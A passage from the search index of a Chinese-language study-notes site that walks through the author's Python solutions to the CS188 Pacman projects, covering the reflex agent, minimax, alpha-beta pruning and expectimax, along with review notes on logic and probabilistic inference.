Agent","text":"<p>\u6587\u6863\u63d0\u9192\u6211\u4eec\u5173\u6ce8\uff1a</p> game.py -&gt; Grid<pre><code>class Grid:\n    \"\"\"\n    A 2-dimensional array of objects backed by a list of lists.  Data is accessed via grid[x][y] where (x,y) are positions on a Pacman map with x horizontal, y vertical and the origin (0,0) in the bottom left corner.\n    \"\"\"\n    def __init__(self, width, height, initialValue=False, bitRepresentation=None):\n        if initialValue not in [False, True]:\n            raise Exception('Grids can only contain booleans')\n        self.CELLS_PER_INT = 30\n\n        self.width = width\n        self.height = height\n        self.data = [[initialValue for y in range(\n            height)] for x in range(width)]\n        if bitRepresentation:\n            self._unpackBits(bitRepresentation)\n    ... # \u7701\u7565\u4e00\u4e9b\u5173\u7cfb\u4e0d\u5927\u7684\u5185\u5bb9\n    def asList(self, key=True):\n        list = []\n        for x in range(self.width):\n            for y in range(self.height):\n                if self[x][y] == key:\n                    list.append((x, y))\n        return list\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#explore","title":"explore","text":"<p>\u5bf9\u4e8e evalution\uff0c\u6211\u4eec\u4e4b\u524d\u4f7f\u7528\u8fc7\u66fc\u54c8\u987f\u8ddd\u79bb\uff0c\u8fd9\u91cc\u4e0d\u59a8\u7ee7\u7eed\u4f7f\u7528\uff1b\u4e0d\u540c\u7684\u662f\uff0c\u8fd9\u6b21\u6211\u4eec\u5e94\u8be5\u628a ghost \u7684\u4f4d\u7f6e\u4e5f\u8003\u8651\u8fdb\u6765\u4e86\uff1b\u6b64\u5916\uff0c\u8ddd\u79bb\u98df\u7269\u8d8a\u8fd1\uff0c\u9b3c\u9b42\u8d8a\u8fdc\uff0c\u5f97\u5206\u5e94\u5f53\u8d8a\u9ad8\uff0c\u8fd9\u91cc\u6309\u7167 project 2 \u4e2d\u7684\u63d0\u793a\u4f7f\u7528\u5012\u6570\uff1a</p> evalutionFunction v1<pre><code>def evaluationFunction(self, currentGameState: GameState, action):\n    # Useful information you can extract from a GameState (pacman.py)\n    successorGameState = currentGameState.generatePacmanSuccessor(action)\n    newPos = successorGameState.getPacmanPosition()\n    newFood = successorGameState.getFood()\n    newGhostStates = successorGameState.getGhostStates()\n    newScaredTimes = [ghostState.scaredTimer for ghostState in newGhostStates]\n\n    # return successorGameState.getScore()\n    \"*** YOUR CODE HERE ***\"\n    # Get the food list and initial score\n    foodList = newFood.asList()\n    score = successorGameState.getScore()\n    # Fooe evaluation\n    for food in foodList:\n        score += 1 / util.manhattanDistance(newPos, food)\n\n    # Ghost evaluation\n    for i, ghostState in enumerate(newGhostStates):\n        ghostPos = ghostState.getPosition()\n        distance = util.manhattanDistance(newPos, ghostPos)\n        if newScaredTimes[i] &gt; 0:\n            # Ghost is scared, it's good to be close\n            score += 2 / (distance + 1) # avoid ZeroDivisionError\n        else:\n            score -= 2 / (distance + 1)  \n\n    return score\n</code></pre> <p>Q1 \u534a\u901a\u8fc7</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#right","title":"right","text":"<p>\u53ef\u4ee5\u770b\u5230\u6b7b\u4e86\u4e24\u6b21\uff0c\u4f46\u662f\u5e73\u5747\u5206\u8fd8\u662f\u633a\u9ad8\u7684\uff1b\u4f46\u662f\u4f9d\u7167\u6211\u4eec\u7684\u6210\u7ee9\u6807\u51c6\uff0c\u4e0d\u6b7b\u624d\u662f\u6bd4\u8f83\u597d\u7684\uff1b\u6240\u4ee5\u6211\u4eec\u79bb ghost \u8fdc\u4e00\u70b9\uff0c\u8fd1\u4e86\u5c31\u7ed9\u4e2a\u201c\u5dee\u8bc4\u201d\uff1a</p> evalutionFunciotn v2<pre><code>def evaluationFunction(self, currentGameState: GameState, action):\n    # Useful information you can extract from a GameState (pacman.py)\n    successorGameState = currentGameState.generatePacmanSuccessor(action)\n    newPos = successorGameState.getPacmanPosition()\n    newFood = successorGameState.getFood()\n    newGhostStates = successorGameState.getGhostStates()\n    newScaredTimes = [ghostState.scaredTimer for ghostState in newGhostStates]\n\n    # return successorGameState.getScore()\n    \"*** YOUR CODE HERE ***\"\n    # Get the food list and initial score\n    foodList = newFood.asList()\n    score = successorGameState.getScore()\n    for food in foodList:\n        score += 1 / util.manhattanDistance(newPos, food)\n\n    # Ghost evaluation\n    for i, ghostState in enumerate(newGhostStates):\n        ghostPos = ghostState.getPosition()\n        distance = util.manhattanDistance(newPos, ghostPos)\n        if newScaredTimes[i] &gt; 0:\n            # Ghost is scared, it's good to be close\n            score += 2 / (distance + 1) # avoid ZeroDivisionError\n        else:\n            if distance &lt; 2: # min_distance\n                score -= 500  # Big penalty for being too close\n            else:\n                score -= 2 / (distance + 1)\n\n    return score\n</code></pre> <p>Q1 \u901a\u8fc7</p> <p>\u53ef\u4ee5\u770b\u5230\u6700\u540e\u4e00\u6b21\u4e3a\u4e86\u8eb2\u907f ghost \u5206\u6570\u4f4e\u4e8e\u4e86 1000\uff0c\u4f46\u662f\u6d3b\u7740\u624d\u662f\u786c\u9053\u7406\u3002\u5f53\u7136\u5b58\u5728\u968f\u673a\u6027\uff0c\u90fd\u9ad8\u4e8e 1000 \u4e5f\u4e0d\u662f\u4e0d\u53ef\uff1b\u5982\u679c\u5c06 min_distance \u6539\u4e3a 1\uff0c\u6548\u679c\u548c v1 \u5dee\u4e0d\u591a\uff0c\u53ef\u80fd\u662f\u9003\u8dd1\u7684\u592a\u665a\u4e86\u5427 hhh \u3002</p> <p>\u6700\u540e\u518d\u6765\u6d4b\u8bd5\u4e00\u4e0b <code>python pacman.py --frameTime 0 -p ReflexAgent -k 2</code> </p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u4e5f\u6210\u529f\u901a\u8fc7\u4e86\uff1bmin_distance = 1 \u65f6\u5219\u5931\u8d25\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#q2-5-pts-minimax","title":"Q2 (5 pts): Minimax","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#explore_1","title":"explore","text":"<p>\u5728 project-2 \u4e2d\u7ed9\u51fa\u4e86\u4e00\u4e2a depth=2 \u65f6\u7684\u51b3\u7b56\u6811\uff0c\u6211\u5c06\u5176\u5206\u4e3a\u82e5\u5e72\u5c42 level \uff08\u6700\u4e0a\u65b9\u4e3a level=0\uff09\uff1a</p> <p></p> <p>\u601d\u8def\uff1agetAction \u4eff\u7167 Q1 \u4e2d\u7684</p> MinimaxAgent -&gt; getAction v1<pre><code>def getAction(self, gameState: GameState):\n    \"*** YOUR CODE HERE ***\"\n    # Pacman is always agent 0, and the agents move in order of increasing agent index.\n    legalActions = gameState.getLegalActions(0)\n    scores = self.getNextLevel(gameState, 0, 0)\n    bestScore = max(scores)\n    bestIndices = [\n        index for index in range(len(scores)) if scores[index] == bestScore\n    ]\n    chosenIndex = random.choice(bestIndices)  # Pick randomly among the best\n    return legalActions[chosenIndex]\n    util.raiseNotDefined()\n\n# return a scores: [int]\ndef getNextLevel(self, gameState: GameState, agentIndex, level):\n    agentIndex = agentIndex % gameState.getNumAgents()\n    legalActions = gameState.getLegalActions(agentIndex)\n    successors = [\n        gameState.generateSuccessor(agentIndex, action) for action in legalActions\n    ]\n    return [\n        self.getValue(successor, agentIndex + 1, level + 1)\n        for successor in successors\n    ]\n\n# return a score\ndef getValue(self, gameState: GameState, agentIndex=0, level=0):\n    if (\n        gameState.isWin()\n        or gameState.isLose()\n        or level == self.depth * gameState.getNumAgents()\n    ):\n        return self.evaluationFunction(gameState)\n    if agentIndex == 0:\n        return max(self.getNextLevel(gameState, agentIndex, level))\n    else:\n        return min(self.getNextLevel(gameState, agentIndex, level))\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#right_1","title":"right","text":"MinimaxAgent -&gt; getAction v2<pre><code>def getAction(self, gameState: GameState):\n    \"*** YOUR CODE HERE ***\"\n    def getValue(state, agentIndex, depth):\n        agentIndex = agentIndex % state.getNumAgents()\n        if state.isWin() or state.isLose() or depth == 0:\n            return self.evaluationFunction(state)\n        elif agentIndex == 0:\n            return max(\n                getValue(\n                    state.generateSuccessor(agentIndex, action),\n                    agentIndex + 1,\n                    depth - 1,\n                )\n                for action in state.getLegalActions(agentIndex)\n            )\n        else:\n            return min(\n                getValue(\n                    state.generateSuccessor(agentIndex, action),\n                    agentIndex + 1,\n                    depth - 1,\n                )\n                for action in state.getLegalActions(agentIndex)\n            )\n    # Pacman is always agent 0, and the agents move in order of increasing agent index.\n    legalActions = gameState.getLegalActions(0)\n    scores = [\n        getValue(\n            gameState.generateSuccessor(0, action),\n            1,\n            self.depth * gameState.getNumAgents() - 1,\n        )\n        for action in legalActions\n    ]\n    bestScore = max(scores)\n    bestIndices = [\n        index for index in range(len(scores)) if scores[index] == bestScore\n    ]\n    chosenIndex = random.choice(bestIndices)  # Pick randomly among the best\n    return legalActions[chosenIndex]\n</code></pre> <p>Q2 \u901a\u8fc7</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#q3-5-pts-alpha-beta-pruning","title":"Q3 (5 pts): Alpha-Beta Pruning","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#explore_2","title":"explore","text":"<p>\u5728 05-Trees_Minimax_Pruning \u4e2d\u6211\u4eec\u63d0\u5230\u4e86 Alpha-Beta Pruning \u7684\u4f2a\u4ee3\u7801\uff0c\u7531\u4e0a\u4e00\u9898\u7684\u4ee3\u7801\uff0c\u6211\u4eec\u5c06\u5176 agentIndex \u4e0d\u540c\u65f6\u7684\u64cd\u4f5c\u66f4\u6362\u5373\u53ef\uff1a</p> AlphaBetaAgent -&gt; getAction v1<pre><code>def getAction(self, gameState: GameState):\n    def max_value(state, agentIndex, level, alpha, beta):\n        v = float(\"-inf\")\n        for action in state.getLegalActions(agentIndex):\n            v = max(\n                v,\n                getValue(\n                    state.generateSuccessor(agentIndex, action),\n                    agentIndex + 1,\n                    level + 1,\n                    alpha,\n                    beta,\n                ),\n            )\n            if v &gt; beta:\n                return v\n            alpha = max(alpha, v)\n        return v\n\n    def min_value(state, agentIndex, level, alpha, beta):\n        v = float(\"inf\")\n        for action in state.getLegalActions(agentIndex):\n            v = min(\n                v,\n                getValue(\n                    state.generateSuccessor(agentIndex, action),\n                    agentIndex + 1,\n                    level + 1,\n                    alpha,\n                    beta,\n                ),\n            )\n            if v &lt; alpha:\n                return v\n            beta = min(beta, v)\n        return v\n\n    def getValue(state, agentIndex, level, alpha, beta):\n        agentIndex = agentIndex % state.getNumAgents()\n        if (\n            state.isWin()\n            or state.isLose()\n            or level == self.depth * gameState.getNumAgents() - 1\n        ):\n            return self.evaluationFunction(state)\n        elif agentIndex == 0:\n            return max_value(state, agentIndex, level, alpha, beta)\n        else:\n            return min_value(state, agentIndex, level, alpha, beta)\n\n    # Pacman is always agent 0, and the agents move in order of increasing agent index.\n    legalActions = gameState.getLegalActions(0)\n    alpha = float(\"-inf\")\n    beta = float(\"inf\")\n    scores = [\n        getValue(gameState.generateSuccessor(0, action), 1, 0, alpha, beta)\n        for action in legalActions\n    ]\n    bestScore = max(scores)\n    bestIndices = [\n        index for index in range(len(scores)) if scores[index] == bestScore\n    ]\n    chosenIndex = random.choice(bestIndices)  # Pick randomly among the best\n    return legalActions[chosenIndex]\n</code></pre> <p>\u4f46\u662f\u8fd0\u884c\u4f9d\u65e7\u662f\u5931\u8d25\u7684\uff0c\u90e8\u5206\u6d4b\u8bd5\u65e0\u6cd5\u901a\u8fc7\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#right_2","title":"right","text":"<p>\u53c2\u8003 szzxljr \u7684\u4ee3\u7801 \u6211\u53d1\u73b0\u4e86\u95ee\u9898\uff1a\u6211\u5728\u6700\u540e\u83b7\u53d6\u6839\u8282\u70b9\u7684\u503c\u662f\u4f9d\u65e7\u904d\u5386\u4e86\u5176\u6240\u6709\u5b50\u4ee3\uff1b\u5728\u6700\u540e\u6211\u4eec\u4f9d\u65e7\u5e94\u8be5\u526a\u679d\uff1a</p> AlphaBetaAgent -&gt; getAction v2<pre><code>def getAction(self, gameState: GameState):\n    \"*** YOUR CODE HERE ***\"\n\n    def getValue(state, agentIndex, level, alpha, beta):\n        agentIndex = agentIndex % state.getNumAgents()\n        if (\n            state.isWin()\n            or state.isLose()\n            or level == self.depth * state.getNumAgents()\n        ):\n            return self.evaluationFunction(state)\n        elif agentIndex == 0:\n            return max_value(state, agentIndex, level, alpha, beta)\n        else:\n            return min_value(state, agentIndex, level, alpha, beta)\n\n    def max_value(state, agentIndex, level, alpha, beta):\n        v = float(\"-inf\")\n        for action in state.getLegalActions(agentIndex):\n            v = max(\n                v,\n                getValue(\n                    state.generateSuccessor(agentIndex, action),\n                    agentIndex + 1,\n                    level + 1,\n                    alpha,\n                    beta,\n                ),\n            )\n            if v &gt; beta:\n                return v\n            alpha = max(alpha, v)\n        return v\n\n    def min_value(state, agentIndex, level, alpha, beta):\n        v = float(\"inf\")\n        for action in state.getLegalActions(agentIndex):\n            v = min(\n                v,\n                getValue(\n                    state.generateSuccessor(agentIndex, action),\n                    agentIndex + 1,\n                    level + 1,\n                    alpha,\n                    beta,\n                ),\n            )\n            if v &lt; alpha:\n                return v\n            beta = min(beta, v)\n        return v\n\n    # Pacman is always agent 0, and the agents move in order of increasing agent index.\n    legalActions = gameState.getLegalActions(0)\n    alpha = float(\"-inf\")\n    beta = float(\"inf\")\n    bestScore = float(\"-inf\")\n    bestAction = None\n\n    for action in legalActions:\n        score = getValue(gameState.generateSuccessor(0, action), 1, 1, alpha, beta)\n        if score &gt; bestScore:\n            bestScore = score\n            bestAction = action\n        alpha = max(alpha, bestScore)\n\n    return bestAction\n</code></pre> <p>Q3 \u901a\u8fc7</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#q4-5-pts-expectimax","title":"Q4 (5 pts): Expectimax","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#right_3","title":"right","text":"<p>\u4e3a\u4ec0\u4e48 Q4 \u6ca1\u6709 explore? expectimax \u548c minimax \u7684\u533a\u522b\u53ea\u6709\u4e00\u4e2a\uff0cghost level \u7684\u6548\u679c\u4e0d\u518d\u662f\u53d6\u6700\u5c0f\uff0c\u800c\u662f\u53d6\u5e73\u5747\uff0c\u6539\u6539 Q2 \u4e0d\u5c31\u597d\u4e86\uff1a</p> ExpectimaxAgent -&gt; getAction<pre><code>def getAction(self, gameState: GameState):\n    \"*** YOUR CODE HERE ***\"\n    def getValue(state, agentIndex, depth):\n        agentIndex = agentIndex % state.getNumAgents()\n        if state.isWin() or state.isLose() or depth == 0:\n            return self.evaluationFunction(state)\n        elif agentIndex == 0:\n            return max(\n                getValue(\n                    state.generateSuccessor(agentIndex, action),\n                    agentIndex + 1,\n                    depth - 1,\n                )\n                for action in state.getLegalActions(agentIndex)\n            )\n        else: # \u552f\u4e00\u6539\u52a8\u4e4b\u5904\n            return sum(\n                getValue(\n                    state.generateSuccessor(agentIndex, action),\n                    agentIndex + 1,\n                    depth - 1,\n                )\n                for action in state.getLegalActions(agentIndex)\n            ) / len(state.getLegalActions(agentIndex))\n\n    # Pacman is always agent 0, and the agents move in order of increasing agent index.\n    legalActions = gameState.getLegalActions(0)\n    scores = [\n        getValue(\n            gameState.generateSuccessor(0, action),\n            1,\n            self.depth * gameState.getNumAgents() - 1,\n        )\n        for action in legalActions\n    ]\n    bestScore = max(scores)\n    bestIndices = [\n        index for index in range(len(scores)) if scores[index] == bestScore\n    ]\n    chosenIndex = random.choice(bestIndices)  # Pick randomly among the best\n    return legalActions[chosenIndex]\n    util.raiseNotDefined()\n</code></pre> <p>Q4 \u901a\u8fc7</p> <p></p> <p><code>ExpectimaxAgent</code>\u00a0wins about half the time, while <code>AlphaBetaAgent</code>\u00a0always loses.</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#q5-6-pts-evaluation-function","title":"Q5 (6 pts): Evaluation Function","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#right_4","title":"right","text":"<p>\u5176\u5b9e\u548c Q1 \u5dee\u4e0d\u591a\uff08\u56e0\u4e3a\u6211\u4eec\u5f53\u65f6\u7684\u5b9e\u73b0\u5c31\u633a\u4e0d\u9519\u4e86\uff09\uff0c\u6539\u4e3a\u8bc4\u4f30\u5f53\u524d\u72b6\u6001\u5c31\u597d\u4e86\u3002</p> betterEvaluationFunction<pre><code>def betterEvaluationFunction(currentGameState: GameState):\n    \"\"\"\n    DESCRIPTION: &lt;write something here so we know what you did&gt;\n    Just as what we do in ReflexAgent, but now we evaluate currentGameState\n    \"\"\"\n    \"*** YOUR CODE HERE ***\"\n    Pos = currentGameState.getPacmanPosition()\n    Food = currentGameState.getFood()\n    GhostStates = currentGameState.getGhostStates()\n    ScaredTimes = [ghostState.scaredTimer for ghostState in GhostStates]\n    foodList = Food.asList()\n    score = currentGameState.getScore()\n    for food in foodList:\n        score += 1 / util.manhattanDistance(Pos, food)\n    # Ghost evaluation\n    for i, ghostState in enumerate(GhostStates):\n        ghostPos = ghostState.getPosition()\n        distance = util.manhattanDistance(Pos, ghostPos)\n        if ScaredTimes[i] &gt; 0:\n            # Ghost is scared, it's good to be close\n            score += 2 / (distance + 1)\n        else:\n            # Ghost is not scared, avoid it\n            if distance &lt; 2:\n                score -= 500  # Big penalty for being too close\n            else:\n                score -= 2 / (distance + 1)\n    return score\n    util.raiseNotDefined()\n</code></pre> <p>Q5 \u901a\u8fc7</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#pass","title":"pass","text":"<ul> <li>project-2 \u5168\u90e8\u901a\u8fc7</li> <li>\u5168\u4ee3\u7801</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-3/","title":"Logic","text":"<p>Prerequisite</p> <ul> <li>07-Propositional_Logic_and_Planning</li> <li>08-DPLL&amp;ForwardChaining</li> <li>09-First_Order_Logic</li> <li>10-Intro_to_Probability</li> <li>project 3\uff08\u82e5\u9700\u8981\u8ba4\u8bc1\uff0c\u53ef\u89c1\u4ed3\u5e93\uff09</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-3/#quick-review","title":"Quick Review","text":"<ul> <li>DPLL\uff08Davis-Putnam-Logemann-Loveland \u7b97\u6cd5\uff09<ul> <li>DPLL \u7b97\u6cd5\u662f\u4e00\u79cd\u6df1\u5ea6\u4f18\u5148\u56de\u6eaf\u641c\u7d22\u7b97\u6cd5\uff0c\u65e8\u5728\u89e3\u51b3\u53ef\u6ee1\u8db3\u6027\u95ee\u9898\uff08SAT\uff09\uff0c\u5373\u7ed9\u5b9a\u4e00\u4e2a\u903b\u8f91\u53e5\u5b50\uff0c\u627e\u5230\u6240\u6709\u7b26\u53f7\u7684\u6709\u6548\u8d4b\u503c\u3002\u8be5\u7b97\u6cd5\u901a\u8fc7\u4e09\u79cd\u6280\u5de7\u51cf\u5c11\u8fc7\u5ea6\u56de\u6eaf\uff1a\u65e9\u671f\u7ec8\u6b62\u3001\u7eaf\u7b26\u53f7\u542f\u53d1\u5f0f\u548c\u5355\u5143\u5b50\u53e5\u542f\u53d1\u5f0f\u3002DPLL \u5904\u7406\u7684\u8f93\u5165\u662f\u5408\u53d6\u8303\u5f0f\uff08CNF\uff09\uff0c\u5e76\u901a\u8fc7\u4e0d\u65ad\u8d4b\u503c\u7b26\u53f7\u7684\u771f\u503c\uff0c\u76f4\u5230\u627e\u5230\u6ee1\u8db3\u6a21\u578b\u6216\u65e0\u6cd5\u8d4b\u503c\u4e3a\u6b62\u3002</li> </ul> </li> <li>Forward Chaining\uff08\u524d\u5411\u63a8\u7406\uff09<ul> <li>\u524d\u5411\u63a8\u7406\u662f\u4e00\u79cd\u63a8\u7406\u65b9\u6cd5\uff0c\u5e38\u7528\u4e8e\u89e3\u51b3\u53ef\u6ee1\u8db3\u6027\u95ee\u9898\uff08SAT\uff09\u3002\u5b83\u901a\u8fc7\u4ece\u5df2\u77e5\u7684\u4e8b\u5b9e\u51fa\u53d1\uff0c\u9010\u6b65\u5e94\u7528\u89c4\u5219\u6765\u63a8\u5bfc\u65b0\u7684\u4e8b\u5b9e\uff0c\u76f4\u5230\u8fbe\u5230\u76ee\u6807\u6216\u65e0\u6cd5\u518d\u63a8\u5bfc\u51fa\u65b0\u4e8b\u5b9e\u4e3a\u6b62\u3002\u5728SAT\u4e2d\uff0c\u524d\u5411\u63a8\u7406\u53ef\u4ee5\u7528\u4e8e\u4ece\u5df2\u77e5\u7684\u903b\u8f91\u53e5\u5b50\u4e2d\u63a8\u5bfc\u51fa\u65b0\u7684\u8d4b\u503c\uff0c\u4ece\u800c\u5e2e\u52a9\u786e\u5b9a\u662f\u5426\u5b58\u5728\u6ee1\u8db3\u6761\u4ef6\u7684\u6a21\u578b\u3002</li> </ul> </li> <li>First-order Logic\uff08\u7b2c\u4e00\u9636\u903b\u8f91\uff0cFOL\uff09<ul> <li>\u7b2c\u4e00\u9636\u903b\u8f91\u662f\u4e00\u79cd\u5f62\u5f0f\u903b\u8f91\u7cfb\u7edf\uff0c\u4f7f\u7528\u91cf\u8bcd\u548c\u53d8\u91cf\u6765\u8868\u8fbe\u5173\u4e8e\u5bf9\u8c61\u7684\u547d\u9898\u3002\u4e0e\u547d\u9898\u903b\u8f91\u4e0d\u540c\uff0c\u7b2c\u4e00\u9636\u903b\u8f91\u5141\u8bb8\u4f7f\u7528\u91cf\u8bcd\uff08\u5982\u201c\u5bf9\u4e8e\u6240\u6709\u201d\u548c\u201c\u5b58\u5728\u201d\uff09\u6765\u5904\u7406\u66f4\u590d\u6742\u7684\u903b\u8f91\u5173\u7cfb\u3002</li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-3/#explain","title":"explain","text":"<p>\u5b9e\u8bdd\u8bf4\uff0cproject 3 \u76f8\u6bd4\u4e8e\u8003\u5bdf\u903b\u8f91\u8fd0\u7b97\uff0c\u4e2a\u4eba\u611f\u89c9\u8003\u5bdf python \u66f4\u52a0\u591a\uff1b\u56e0\u4e3a\u5728\u8bb2\u89e3\u5b9e\u9a8c\u65f6\uff0c\u6587\u6863\u4e2d\u7ed9\u51fa\u4e86\u5f88\u591a\u4f2a\u4ee3\u7801\uff1b\u54ea\u6015\u6211\u4eec\u4e0d\u77e5\u9053\u5b83\u5728\u5e72\u4ec0\u4e48\uff0c\u7eaf\u9760 python \u7f16\u7a0b\u5b9e\u73b0\u5b83\u4f3c\u4e4e\u4e0d\u662f\u4ec0\u4e48\u96be\u4e8b\u3002</p> <p>\u540c\u65f6\u57fa\u4e8e\u6b64\u65f6\u5176\u4ed6\u6bd4\u8f83\u9700\u8981\u82b1\u8d39\u65f6\u95f4\u7684\u5de5\u4f5c\uff0c\u6211\u66f4\u591a\u53ea\u662f\u7ed3\u5408 project 3 \u5c06 pavlosdais \u7684\u4ee3\u7801\u81ea\u5df1\u8dd1\u4e86\u4e00\u904d\u4f5c\u7f62\u3002\u8be5\u4ee3\u7801\u57fa\u4e8ecs188 sp22 \u7684project \u5b8c\u6210\uff0c\u90e8\u5206\u51fd\u6570\u540d\u548c\u4e00\u4e9b\u4e9b\u7ec6\u8282\u4e0e sp24 \u7684\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u672c\u8eab\u8bb2\u7684\u6bd4\u8f83\u8be6\u7ec6\u4e86\uff0c\u4ed4\u7ec6\u8bfb\u5c31\u80fd\u627e\u5230\u4e0d\u540c\u4e4b\u5904\u3002</p> <ul> <li>\u5bf9\u4e8eQ1-Q5 \u770b\u7684\u6bd4\u8f83\u4ed4\u7ec6\uff0c\u4e5f\u8d5e\u53f9\u4e8e\u5c06\u903b\u8f91\u8868\u8fbe\u5f0f\u201c\u5bf9\u8c61\u5316\u201d\u7684\u64cd\u4f5c\uff1b</li> <li>\u5bf9\u4e8eQ6-Q8 \u770b\u7684\u6bd4\u8f83\u7c97\u7565\uff1b\u867d\u7136\u540e\u4e09\u95ee\u5927\u540c\u5c0f\u5f02\uff0c\u8fd8\u662f\u4f69\u670d pavlosdais \u80fd\u591f\u5f88\u597d\u5730\u5c06\u5b9e\u9a8c\u6587\u6863\u4e2d\u7684\u4f2a\u4ee3\u7801\u5b9e\u4f8b\u5316\u3002</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-3/#pass","title":"pass","text":"<p>\u6211\u81ea\u5df1\u7565\u4f5c\u4fee\u6539\u540e\u7684\u4ee3\u7801\u4e5f\u4f1a\u653e\u5728 solution \u6587\u4ef6\u5939\u4e2d\uff0c\u5df2 \u8fd0\u884c\u5168\u90e8\u901a\u8fc7\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/","title":"Tracing","text":"<p>Prerequisite</p> <ul> <li>10-Intro_to_Probability</li> <li>11-Bayesian_Network_Intro</li> <li>12-Variable_Elimination</li> <li>13-Approximate_Inference</li> <li>14-Markov_Models</li> <li>15-Hidden_Marko_Models</li> <li>16-PF-DN-VPI</li> <li>17-Markov_Decision_Processes</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#quickreview","title":"QuickReview","text":"<ul> <li>\\(P(A|B)=\\sum_{\\omega\\in A\\cap B}P(\\omega|B)=\\frac{P(A\\cap B)}{P(B)}=\\frac{P(B|A)P(A)}{P(B)}\\)</li> <li>Inference By Enumeration\uff08\u679a\u4e3e\u63a8\u7406\uff0cIBE\uff09 <ul> <li>\u679a\u4e3e\u63a8\u7406\u662f\u4e00\u79cd\u901a\u8fc7\u5217\u4e3e\u6240\u6709\u53ef\u80fd\u7684\u6a21\u578b\u6216\u8d4b\u503c\u6765\u8ba1\u7b97\u6982\u7387\u63a8\u7406\u7684\u65b9\u6cd5\u3002\u8be5\u65b9\u6cd5\u9002\u7528\u4e8e\u79bb\u6563\u53d8\u91cf\uff0c\u901a\u5e38\u7528\u4e8e\u8ba1\u7b97\u7ed9\u5b9a\u8bc1\u636e\u4e0b\u7684\u6761\u4ef6\u6982\u7387\u3002\u901a\u8fc7\u5bf9\u6240\u6709\u53ef\u80fd\u7684\u8d4b\u503c\u8fdb\u884c\u904d\u5386\uff0cIBE\u80fd\u591f\u51c6\u786e\u5730\u5f97\u51fa\u6240\u9700\u7684\u6982\u7387\u503c\uff0c\u4f46\u5728\u5904\u7406\u5927\u89c4\u6a21\u95ee\u9898\u65f6\u53ef\u80fd\u4f1a\u9762\u4e34\u8ba1\u7b97\u6548\u7387\u4f4e\u4e0b\u7684\u95ee\u9898\u3002</li> </ul> </li> <li>Variable Elimination\uff08\u53d8\u91cf\u6d88\u5143\uff09 <ul> <li>\u53d8\u91cf\u6d88\u5143\u662f\u4e00\u79cd\u7528\u4e8e\u6982\u7387\u56fe\u6a21\u578b\uff08\u5982\u8d1d\u53f6\u65af\u7f51\u7edc\u548c\u9a6c\u5c14\u53ef\u592b\u968f\u673a\u573a\uff09\u7684\u63a8\u7406\u7b97\u6cd5\u3002\u8be5\u7b97\u6cd5\u901a\u8fc7\u9010\u6b65\u6d88\u9664\u4e0d\u76f8\u5173\u7684\u53d8\u91cf\uff0c\u6765\u8ba1\u7b97\u6761\u4ef6\u6982\u7387\u6216\u8fb9\u9645\u6982\u7387\u3002\u53d8\u91cf\u6d88\u5143\u7684\u6838\u5fc3\u601d\u60f3\u662f\u5c06\u590d\u6742\u7684\u63a8\u7406\u95ee\u9898\u8f6c\u5316\u4e3a\u8f83\u7b80\u5355\u7684\u8ba1\u7b97\uff0c\u4ece\u800c\u63d0\u9ad8\u63a8\u7406\u6548\u7387\u3002</li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explain","title":"explain","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#q1","title":"Q1","text":"<p>\u975e\u5e38\u91cd\u8981\u7684\u4e00\u6b65\uff1a\u628a bayesNet.py \u5927\u81f4\u770b\u4e00\u904d\uff0c\u8fd0\u884c\u5e76\u5bf9\u7167 printStarterBayesNet \u51fd\u6570\u7684\u5185\u5bb9\u5bf9\u7167\u67e5\u770b\u8f93\u51fa\uff0c\u6559\u5bfc\u6211\u4eec\u8be5\u5982\u4f55\u521b\u5efa\u3001\u4f7f\u7528\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#explore","title":"explore","text":"<p>\u5728 Question 1 (2 points): Bayes Net Structure \u4e2d\u5f88\u6e05\u695a\u7684\u544a\u8bc9\u6211\u4eec\u5e94\u8be5\u5e72\u4ec0\u4e48\uff0c\u4eff\u7167 printStarterBayesNet\uff0c\u58f0\u660e variables, edges, domains \u5373\u53ef\u3002</p> <p>\u5728\u6dfb\u52a0 variableDomainsDict[OBS0/1] \u65f6\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\uff1a\u8d77\u521d\u8bbe\u7f6e <code>variableDomainsDict[OBS0]=range(MAX_NOISE)</code>\uff0c\u51fa\u73b0\u4e0b\u9762\u7684\u7ed3\u679c\uff1a</p> <p></p> <p>\u53ef\u89c1\u89c2\u5bdf\u91cf\u5e94\u5f53\u662f\u5728\u8003\u8651 noise \u540e\u7684\u6240\u6709\u53ef\u80fd\u66fc\u54c8\u987f\u8ddd\u79bb\u503c\uff0c\u6545\u627e\u5230 MAX_DISTANCE=X_RANGE+Y_RANGE \u5373\u53ef\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-4/#right","title":"right","text":"constructBayesNet<pre><code>def constructBayesNet(gameState: hunters.GameState):\n    # constants to use\n    PAC = \"Pacman\"\n    GHOST0 = \"Ghost0\"\n    GHOST1 = \"Ghost1\"\n    OBS0 = \"Observation0\"\n    OBS1 = \"Observation1\"\n    X_RANGE = gameState.getWalls().width\n    Y_RANGE = gameState.getWalls().height\n    # 